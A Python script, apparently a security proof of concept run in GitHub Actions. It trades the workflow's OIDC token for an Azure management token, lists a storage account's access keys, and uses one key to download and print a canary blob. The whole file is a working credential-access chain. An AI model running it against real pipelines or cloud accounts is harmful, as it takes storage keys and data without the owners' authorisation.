import base64
import json
import os
import subprocess
import urllib.error
import urllib.parse
import urllib.request


def claims(jwt):
    payload = jwt.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload))


print("NO_AZURE_CREDENTIAL_USED=true")
client_id = os.environ["CLIENT_ID"]
tenant_id = os.environ["TENANT_ID"]
subscription_id = os.environ["SUB_ID"]
storage_account = os.environ["STOR"]
resource_group = os.environ["RG"]

request_url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api://AzureADTokenExchange"
request = urllib.request.Request(
    request_url,
    headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]},
)
oidc = json.load(urllib.request.urlopen(request))["value"]
oidc_claims = claims(oidc)
print("OIDC_SUB=" + oidc_claims.get("sub", ""))
print("OIDC_ISS=" + oidc_claims.get("iss", ""))
print("OIDC_AUD=" + oidc_claims.get("aud", ""))

body = urllib.parse.urlencode(
    {
        "grant_type": "client_credentials",
        "client_id": client_id,
        "scope": "https://management.azure.com/.default",
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": oidc,
    }
).encode()
token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
try:
    response = json.load(urllib.request.urlopen(urllib.request.Request(token_url, data=body)))
except urllib.error.HTTPError as error:
    print("EXCHANGE_FAILED=" + error.read().decode()[:500])
    raise SystemExit(0)

arm_token = response["access_token"]
arm_claims = claims(arm_token)
print(
    "ARM_TOKEN_OBTAINED "
    f"oid={arm_claims.get('oid')} appid={arm_claims.get('appid')} aud={arm_claims.get('aud')}"
)
list_keys_url = (
    f"https://management.azure.com/subscriptions/{subscription_id}/resourceGroups/{resource_group}"
    f"/providers/Microsoft.Storage/storageAccounts/{storage_account}/listKeys?api-version=2023-01-01"
)
try:
    keys = json.load(
        urllib.request.urlopen(
            urllib.request.Request(
                list_keys_url,
                data=b"",
                headers={"Authorization": "Bearer " + arm_token},
            )
        )
    )
except urllib.error.HTTPError as error:
    print("LISTKEYS_FAILED=" + error.read().decode()[:500])
    raise SystemExit(0)

print("LISTKEYS_PERMISSIONS=" + json.dumps([key["permissions"] for key in keys["keys"]]))
account_key = keys["keys"][0]["value"]
print("::add-mask::" + account_key)
subprocess.run(
    [
        "az",
        "storage",
        "blob",
        "download",
        "--account-name",
        storage_account,
        "--account-key",
        account_key,
        "-c",
        "canary",
        "-n",
        "canary.txt",
        "-f",
        "/tmp/fpv-canary.txt",
        "--only-show-errors",
    ],
    check=False,
)
try:
    with open("/tmp/fpv-canary.txt", encoding="utf-8") as canary_file:
        print("CANARY_BLOB_CONTENT=" + canary_file.read().strip())
except OSError as error:
    print("CANARY_READ_FAILED=" + str(error))
